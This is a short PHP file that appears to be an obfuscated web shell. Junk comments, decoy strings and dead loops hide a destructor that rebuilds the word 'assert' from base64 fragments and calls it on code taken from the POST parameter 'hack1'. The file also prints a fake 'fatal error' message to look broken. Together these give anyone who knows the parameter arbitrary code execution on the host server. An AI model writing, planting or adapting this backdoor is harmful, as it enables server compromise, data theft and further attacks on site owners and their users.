<?php
/*2&JD6Cr$8y8KzAvWke+tiZ4azyfZRbo2R^@MLE(8B3KYebimfsM(bgPPEiFB*Yymv#Oo!&4r5ap3!s#@3SsQr!XVyJV6(459iX#T0GwUiHJ*QhIp6ccfG%bpHtpQ~k9HmAq4wIj!vD)G9n52P$_Uy3b6nOud@@~ZjvSU2WFt@7CW#WBM0c*m*GM0XSHtmrHpUFAGQ&LNzR42pvLJC!w*b%YxYPku@JM$EJLW3#a($U%OX&D2g4aQE17BoenkF9Ec^wu85IbS5mBlK)*4TM1nUh63gdQAbnRcrmTCnP&tFuaWo@WHKf!tNLm5RXqg#*0%O2OO8Z8Z0@&pHNq$nA*#jzQy@6!E@m2_SHe(rpir0PV8^4HEu)BNfP3*+UC@SEQy8ldw6znK+d$r+ihWxABwFj#fkE^K!*)efhI5h4f2GgL(K$jkf$q2F%gGblygI!mDGAi$tgM)Q1Pa_&MOp9~H3Bk_FKFz%bSsDk25pw5_4%gDDI5+NiG1)MbRbbdvT8$XNiz7UFh6nYyF6djHl2IG@*_%@LuyIh%WLRnOjQnor$eqm$JVfJ%Kt4OvXZA0637H&lS1#3*/
class aa
{
  public $xxxxx = '6RIppYabHk0Say%le2LcAivGExdsafwasds03onip&D$rFxJfR';
  public $ccc = 'ccbKtryNiD8vXvMGtSVRgRrczxxq4#$~jZt$fTBZ?P_K6T8RdX';
  public $fff = 'KqZWWKvLmv3ptcS1%$j6qMj22Vnoe@M5H1xS$Ri@lRlbP9&tQx';
  public $a = '';
  function __destruct(){
  $m = '0';
  if($m>0)
  {
    for ($x=0; $x<=999999999; $x++) 
    {
    echo "sdasfsfaffawgsdfjpkdg";
    } 
  }  
  $mm = 'Z';
  if($mm<0)
  {
    for ($x=0; $x<=999999999; $x++) 
    {
    echo "sdasfsfaffawgsdfjpkdg";
    } 
  }  
  $mmm = 'X';
  if($mmm<0)
  {
    for ($x=0; $x<=999999999; $x++) 
    {
    echo "sdasfsfaffawgsdfjpkdg";
    } 
  }  
  $mmmm = 'Y';
  if($mmmm<0)
  {
    for ($x=0; $x<=999999999; $x++) 
    {
    echo "sdasfsfaffawgsdfjpkdg";
    } 
  }  
  $mmmmm = 'z';
  if($mmmmm<0)
  {
    for ($x=0; $x<=999999999; $x++) 
    {
    echo "sdasfsfaffawgsdfjpkdg";
    } 
  }  
  $mmmmmm = 'N';
  if($mmmmmm<0)
  {
    for ($x=0; $x<=999999999; $x++) 
    {
    echo "sdasfsfaffawgsdfjpkdg";
    } 
  }
  $rr=
  $mmmmmmm= 'X';
    if($mmmmmmm<0)
  {
    for ($x=0; $x<=999999999; $x++) 
    {
    echo "sdasfsfaffawgsdfjpkdg";
    } 
  }
  $mmmmmmmm = 'J';
  if($mmmmmmmm<0)
  {
    for ($x=0; $x<=999999999; $x++) 
    {
    echo "sdasfsfaffawgsdfjpkdg";
    } 
  }
  $rr=$mmmm.$mmm.$mmmmmm;
  $rrr=$mmmmm.$mm.$mmmmmmm;
  $rrrr=$mmmmmmmm.$m;
  $y=$rr.$rrr.$rrrr;
  $lfjasmmckwakksdwa=base64_decode($y);
  $lfjasmmckwakksdwa("$this->a");
  }
}
$ggggg=${"_"."P"."O"."ST"}["hack1"];
if(empty($ggggg))
{
 echo "A fatal error has occurred";   
 for ($x=0; $x<=999999999; $x++) 
 {
 echo "";
 } 
}
$b = new aa;
$xxxxx=$ccc;
$ccc=$fff;
$fff=$xxxxx;
$xxxxx=$ccc;
$x='S3FaV1dLdkxtdjNwdGNTMSUkajZxTWoyMlZub2VATTVIMXhTJFJpQGxSbGJQOSZ0UXg=';
$xxxxx=base64_decode($x);
if($xxxxx='KqZWWKvLmv3ptcS1%$j6qMj22Vnoe@M5H1xS$Ri@lRlbP9&tQx')
{
$b->a = ${"_"."P"."O"."ST"}["hack1"];
}
?>